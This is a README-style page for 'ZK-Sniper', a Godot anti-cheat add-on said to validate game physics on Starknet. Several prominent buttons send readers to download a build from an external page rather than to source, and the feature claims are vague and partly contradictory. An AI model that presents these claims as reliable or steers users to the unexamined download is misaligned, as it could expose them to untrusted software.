# ZK-Sniper / Obsidian Anti-Cheat v1.0 - Game Integrity Tool 2026

> **A non-invasive anti-cheat layer for first-person shooters.** It swaps kernel-level inspection for on-chain physics validation on Starknet, helping keep player data private while blocking aimbots and wallhacks.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Godot-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/michael-ross2000/obsidian-anti-cheat-v1-0?style=flat-square)](https://github.com/michael-ross2000/obsidian-anti-cheat-v1-0)

---

<p align="center">
  <a href="https://michael-ross2000.github.io/obsidian-anti-cheat-v1-0/">
    <img src="https://img.shields.io/badge/Download-ZK-Sniper%20Script-brightgreen?style=for-the-badge" alt="Download ZK-Sniper Script">
  </a>
</p>

> **[Direct Download - ZK-Sniper](https://michael-ross2000.github.io/obsidian-anti-cheat-v1-0/)**

---

[Download Latest Build](https://michael-ross2000.github.io/obsidian-anti-cheat-v1-0/)

---

## What this project does

ZK-Sniper rethinks anti-cheat for competitive FPS games. Rather than checking local files or watching system processes, it treats game physics as Cairo contracts running on Starknet. Shots, movement, and in-game interactions are verified cryptographically without revealing personal player data, which creates a trustless setup where cheating becomes computationally impractical.

Verification happens on-chain, while execution remains local through katana and starkli. A Torii indexer drives live UI updates so players can view verified game state without adding meaningful overhead. The result is an alternative to kernel-level spyware that leaves users in control of their machines while match integrity is enforced through zero-knowledge proofs.

## Script Features

- **No kernel drivers or file scanning** - Uses on-chain verification instead of touching local system resources
- **Game physics enforced as Cairo contracts** - Movement and shooting rules are checked through cryptographic proofs on Starknet
- **Local execution with katana and starkli** - Performs verification locally without forwarding private data to outside services
- **Torii indexer for real-time UI** - Presents verified game state and match data in a lightweight interface
- **Cryptographically verifiable transactions** - Each action produces a proof that can be checked independently
- **Privacy-preserving architecture** - No player telemetry or behavioral data is collected or transmitted

## Setup

1. Download the latest build from the link above
2. Extract the script files to your Godot project's addons folder
3. Configure katana and starkli for local Starknet execution
4. Launch the Torii indexer for real-time verification display
5. Load the game scene and verify the anti-cheat module activates

```
# Example configuration snippet
./katana --disable-fee --allowed-origins "*"
starkli --rpc http://localhost:5050
torii --world 0x... --rpc http://localhost:5050
```

## Options

| Setting | Values | Description |
|---------|--------|-------------|
| Verification Mode | `on-chain`, `local`, `hybrid` | Choose where proofs are validated |
| Proof Frequency | `per-shot`, `per-round`, `per-match` | How often cryptographic proofs are generated |
| UI Display | `enabled`, `disabled` | Toggle Torii indexer overlay |
| Log Level | `info`, `debug`, `error` | Control console output verbosity |

## Compatibility

- **Game Engine**: Godot 4.x
- **Blockchain**: Starknet (testnet/mainnet)
- **Local Tools**: katana v0.7+, starkli v0.3+, Torii v0.3+
- **Known Limitations**: Requires stable internet connection for on-chain verification; local mode reduces but does not eliminate latency

## FAQ

**How do I set up the anti-cheat for my Godot project?**  
Put the script files into your project's addons directory, then configure the Starknet local tools using the setup instructions above.

**Does this script update automatically?**  
No. New contract releases require manual updates. Check the repository for the latest releases.

**Can I customize the verification frequency?**  
Yes. The options table above lets you adjust proof generation frequency to balance security and performance.

**Will this work with existing Godot FPS projects?**  
Integration means adapting your game's physics and shot detection so they can interact with the Cairo contracts. The repository wiki includes a tutorial.

**Where are player proofs stored?**  
All cryptographic proofs live on-chain and are publicly verifiable. Nothing private is kept locally.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
